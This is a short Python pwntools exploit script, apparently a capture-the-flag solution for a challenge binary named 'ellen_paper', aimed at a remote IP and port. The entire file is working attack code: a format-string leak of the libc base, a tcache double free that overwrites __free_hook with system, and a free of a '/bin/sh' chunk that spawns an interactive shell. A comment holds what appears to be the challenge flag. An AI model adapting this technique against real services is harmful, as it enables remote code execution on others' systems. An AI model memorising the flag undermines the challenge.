#exploit for ellen_paper
#h4c(7h1s_1s_4_y0u_3113^)
from pwn import *
import time
elf = ELF("./ellen_paper")
libc=elf.libc
context.binary=elf
#target=process([elf.path])
target=remote('112.213.2.13',40002)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(size,data="A"):
	sla("> ",str(1))
	sla("need?: ",str(size))
	sla("her?: ",data)

def delete(index):
	sla("> ",str(2))
	sla("remove?: ",str(index))

def leaks(fs):
	sla("> ",str(0x79a0))
	time.sleep(0.1)
	target.send(fs)
	leak=target.recvline().strip("\n")
	return leak

fs="%17$p\n"	
libc_base=int(leaks(fs)[2:],16)-0x21b97
libc_free_hook=libc_base+libc.symbols["__free_hook"]
libc_system=libc_base+libc.symbols["system"]
add(0x30)
delete(0)
delete(0)
add(0x30,p64(libc_free_hook))
add(0x30,"/bin/sh\x00")
add(0x30,p64(libc_system))
delete(2)
target.interactive()
